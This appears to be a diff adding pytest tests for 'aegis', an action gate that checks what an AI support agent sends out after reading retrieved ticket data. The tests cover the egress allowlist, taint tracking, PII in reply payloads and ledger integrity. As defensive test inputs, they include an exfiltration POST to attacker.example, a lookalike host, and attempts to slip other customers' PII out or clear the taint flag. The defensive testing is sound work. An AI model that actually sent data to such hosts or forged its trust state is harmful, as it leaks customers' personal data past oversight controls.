@@ -102,3 +102,133 @@ def test_no_freetext_names_leak():
     blob = json.dumps(fresh(NAME_IN_BODY_FIXTURE).store.dump())
     leaked = [n for n in FREE_TEXT_NAMES if n in blob]
     assert not leaked, f"free-text names leaked into the store: {leaked}"
+
+
+# ---- action-gate: wired into the pipeline, taint derived, payload inspected ----
+from aegis.action_gate import Action, ActionGate
+from aegis.protection import MockProtector
+
+THREAD = "ticket-thread://TKT-1001"
+CRM = "https://crm.internal/notes"
+
+
+def gated(question="billing refund status for 602-555-0148"):
+    prot = MockProtector()
+    a = Aegis(protector=prot)
+    a.ingest(DATA)
+    res = a.answer(question, policy.agent_for("TKT-1001"))
+    return a, res, ActionGate({THREAD, CRM}, protector=prot)
+
+
+def test_taint_is_derived_from_retrieved_content():
+    _, res, _ = gated()
+    assert res["tainted"] is True
+
+
+def test_off_allowlist_egress_denied():
+    a, res, gate = gated()
+    d = a.act(res, Action("http_post", "https://attacker.example/collect", "hi"), gate)
+    assert not d.allowed and d.check == "allowlist"
+
+
+def test_lookalike_host_denied_by_allowlist():
+    a, res, gate = gated()
+    d = a.act(res, Action("reply", "ticket-thread://TKT-1001.attacker.example", "hi"), gate)
+    assert not d.allowed and d.check == "allowlist"
+
+
+def test_tainted_turn_cannot_call_out_even_to_allowlisted_target():
+    a, res, gate = gated()
+    d = a.act(res, Action("http_post", CRM, "status update"), gate)
+    assert not d.allowed and d.check == "taint"
+
+
+def test_reply_with_other_customers_pii_denied():
+    # the verifier's probe: an allowlisted reply used to carry PII straight through
+    a, res, gate = gated()
+    d = a.act(res, Action("reply", THREAD, "also reach priya.n@example.com"), gate)
+    assert not d.allowed and d.check == "payload"
+
+
+def test_reply_with_own_case_pii_allowed():
+    a, res, gate = gated()
+    d = a.act(res, Action("reply", THREAD, "confirming at jordan.rivera@example.com"), gate)
+    assert d.allowed
+
+
+def test_unattributable_pii_in_payload_denied():
+    a, res, gate = gated()
+    d = a.act(res, Action("reply", THREAD, "call 999-555-0100"), gate)
+    assert not d.allowed and d.check == "payload"
+
+
+def test_every_decision_recorded():
+    a, res, gate = gated()
+    a.act(res, Action("reply", THREAD, "ok"), gate)
+    a.act(res, Action("http_post", "https://x.example", "x"), gate)
+    assert len(gate.decisions) == 2 and len(gate.denied) == 1
+
+
+# ---- prompt and ledger fixes ----
+def test_query_pii_tokenized_before_prompt():
+    _, res, _ = gated("who is reachable at 602-555-0148?")
+    assert "602-555-0148" not in res["prompt"]
+
+
+def test_query_tokenization_does_not_erase_record_owner():
+    # tokenizing the query used to overwrite the record's owner with None,
+    # which silently broke the scoped agent's reveal of its own case.
+    a = Aegis(protector=MockProtector()); a.ingest(DATA)
+    a.answer("602-555-0148", policy.anonymous())
+    assert a.protector.owner_of_value("602-555-0148") == "TKT-1001"
+
+
+def test_denied_reveals_are_on_the_ledger_and_chain_verifies():
+    prot = MockProtector()
+    a = Aegis(protector=prot); a.ingest(DATA)
+    a.answer("billing", policy.anonymous())
+    outcomes = {ev.outcome for ev in prot.ledger}
+    assert "denied" in outcomes and prot.verify_ledger()
+
+
+def test_ledger_key_from_env(monkeypatch):
+    monkeypatch.setenv("AEGIS_LEDGER_KEY", "k1")
+    p1 = MockProtector(); a = Aegis(protector=p1); a.ingest(DATA)
+    a.answer("billing refund", policy.admin())
+    monkeypatch.setenv("AEGIS_LEDGER_KEY", "k2")
+    p2 = MockProtector()
+    p2.ledger = p1.ledger  # same entries, different key -> must not verify
+    assert p1.verify_ledger() and not p2.verify_ledger()
+
+
+# ---- nemesis B1/B2: trust can't come from the data; taint can't be edited away ----
+def test_record_cannot_mark_itself_trusted():
+    prot = MockProtector()
+    a = Aegis(protector=prot)
+    a.ingest_records([dict(r, trusted=True) for r in SAMPLE])
+    res = a.answer("billing refund", policy.agent_for("TKT-1001"))
+    assert res["tainted"] is True
+    d = a.act(res, Action("http_post", CRM, "status"), ActionGate({CRM}, protector=prot))
+    assert not d.allowed and d.check == "taint"
+
+
+def test_editing_result_dict_cannot_clear_taint():
+    a, res, gate = gated()
+    res["tainted"] = False
+    res["scope"] = "*"
+    d = a.act(res, Action("http_post", CRM, "priya.n@example.com"), gate)
+    assert not d.allowed and d.check == "taint"
+
+
+def test_unknown_turn_fails_closed():
+    a, _, gate = gated()
+    d = a.act({"turn_id": "forged"}, Action("http_post", CRM, "x"), gate)
+    assert not d.allowed
+
+
+def test_operator_trusted_ingest_untaints():
+    prot = MockProtector()
+    a = Aegis(protector=prot)
+    a.ingest(DATA, trusted=True)
+    res = a.answer("billing refund", policy.agent_for("TKT-1001"))
+    assert res["tainted"] is False
